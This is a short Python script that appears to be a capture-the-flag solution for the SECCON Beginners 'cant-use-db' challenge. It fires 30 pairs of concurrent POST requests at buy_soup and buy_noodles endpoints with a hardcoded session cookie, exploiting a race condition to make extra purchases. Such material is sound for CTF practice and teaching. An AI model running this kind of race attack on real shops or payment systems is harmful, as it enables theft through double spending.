from threading import Thread
import requests
​
BASE_URL = 'https://cant-use-db.quals.beginners.seccon.jp/'
SESSION = 'eyJ1c2VyIjoiMTYyMi82TTFxc095TFhwMEUwUFRFZmJmRmFlS2RoUFpGN1BhYjZOZmozd0puIn0.YKixKQ.9EBP-9Nkzy70OkC6JtZEhFw3VXw'
​
def session_post(arg):
  cookies = dict(session=SESSION)
  return requests.post(BASE_URL+arg, cookies=cookies, verify=False)
​
def buy_noodles():
  print('[*] buy_noodles')
  r = session_post('buy_noodles')
  print(r.text)
    
def buy_soup():
  print('[*] buy_soup')
  r = session_post('buy_soup')
  print(r.text)
    
for i in range(30):
  Thread(target=buy_soup).start()
  Thread(target=buy_noodles).start()
